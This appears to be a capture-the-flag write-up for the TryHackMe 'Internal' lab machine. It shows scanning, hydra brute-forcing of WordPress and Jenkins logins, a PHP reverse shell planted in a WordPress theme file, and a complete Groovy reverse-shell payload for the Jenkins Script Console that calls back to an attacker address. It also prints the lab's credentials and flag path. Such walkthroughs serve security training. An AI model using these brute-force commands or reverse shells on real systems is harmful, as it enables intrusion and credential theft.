# Internal TryHackMe WriteUp  
### Machine's IP = 10.112.182.143  
First of all, let's make a rust scan:  
```bash
rustscan -a 10.112.182.143

Open 10.112.182.143:22
Open 10.112.182.143:80
```
It is a simple apache web-page. Lets discover directories:  
```bash
ffuf -u http://10.112.182.143/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt - .php,.txt,.bak,.zip -fs 0

.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 96ms]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 5389ms]
blog                    [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 104ms]
javascript              [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 378ms]
phpmyadmin              [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 151ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 72ms]
wordpress               [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 74ms]
```

When I access to the blog page, I noticed login section. It is wordpress login page.    
<img width="739" height="934" alt="image" src="https://github.com/user-attachments/assets/af8a64c1-3bc5-49a5-8b7f-b236edb6589e" />    
Look at the error message. It means that there is an "admin" user but we don't know its password. So, I used hydra. Just look at the request by the burpsuite and create our command:  
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.112.182.143 http-post-form "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:F=The password"
``` 
The credentials are --> admin:my2boys    
Lets access it on wordpress login page.    

----
It is really easy to exploit CTF wordpress web-sites. I immediately checked the "Appearance--> Theme editor--> 404.php" file. I paste reverseshell.php [https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php] file into there.   
After updating the file, we need to access this url to get the shell but don't forget to open a nc connection on your terminal.    
```bash
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```
<img width="1564" height="314" alt="image" src="https://github.com/user-attachments/assets/01a02f05-ddf7-4ad3-a274-5acbcfa5d1db" />    
I got the shell.  

----
### User Flag  
I accessed the wordpress config file immediately from this folder  
```bash
cat /var/www/html/wordpress/wp-config.php
```
It gave me database credentials ---> wordpress:wordpress123  
I looked at databases and tables but got only the admin user's credentials that we have already found. So we need to check other folders. I found a file in /opt file. Lets look at its content:  
```bash
cd /opt
cat /opt/wp-save.txt
```
The user's credentials ---> aubreanna:bubb13guM!@#123  

I accessed this user via "su" command and get the flag from there.    

----
### Privilege Escalation  
I saw a file on the aubreanna user's home folder:  
```bash
-rwx------ 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt

aubreanna@internal:~$ cat jenkins.txt
cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```
Hmm, It means there is jenkings. Jenkins is like an automatic robot for developers. Every time a programmer updates their code, Jenkins automatically grabs it, tests it for errors, and deploys it to the server. It replaces slow manual work with a fast, automated "pipeline."    
I used the found parameters and write this command to get the "jenkings" web page on browser.  
```bash
ssh -L 8080:172.17.0.2:8080 aubreanna@10.112.182.143 -N
```
When we access "http://127.0.0.1:8080" we will see the jenkins login page. The default username is "admin" usually so, lets make a brute-force to find its password:  
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-get /
```
The credentials ---> admin:spongebob  

----
When we access the web-site with this login parameters, We will see the most critical part of it. (Manage Jenkins --> Script Console). We can execute reverse shell code in there.    
```bash
String host="192.168.137.68";
int port=4445;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
I searched a lot and found a text file in the /opt folder.   
```bash
cd /opt
cat /opt/note.txt
```
Last credentials ---> root:tr0ub13guM!@#123  

We can use them with ssh and get the root.  













